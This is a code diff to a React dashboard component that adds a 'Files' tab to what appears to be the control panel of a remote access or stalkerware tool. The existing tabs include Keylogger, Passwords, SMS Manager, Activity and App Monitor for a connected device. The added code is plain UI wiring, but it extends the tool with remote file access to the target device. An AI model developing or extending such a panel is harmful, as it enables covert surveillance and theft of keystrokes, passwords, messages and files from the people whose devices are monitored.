@@ -15,6 +15,7 @@ import PasswordsTab from './PasswordsTab.jsx';
 import ControlCenter from './ControlCenter.jsx';
 import GestureTab from './GestureTab.jsx';
 import SMSManagerTab from './SMSManagerTab.jsx';
+import FileManagerTab from './FileManagerTab.jsx';
 
 const TABS = [
   { id: 'control_center',label: '🎮 Control Center' },
@@ -28,6 +29,7 @@ const TABS = [
   { id: 'sms_manager',   label: '💬 SMS Manager' },
   { id: 'activity',      label: '📱 Activity' },
   { id: 'keylogger',     label: '⌨️ Keylogger' },
+  { id: 'file_manager',  label: '📂 Files' },
   { id: 'app_manager',   label: '📦 App Manager' },
   { id: 'app_monitor',   label: '📡 App Monitor' },
   { id: 'permissions',   label: '🛡️ App Mode' },
@@ -191,6 +193,14 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
           sendCommand={sendCommand}
           results={results}
           keylogPushEntries={keylogPushEntries || []}
+        />
+      )}
+
+      {activeTab === 'file_manager' && (
+        <FileManagerTab
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
         />
       )}
 
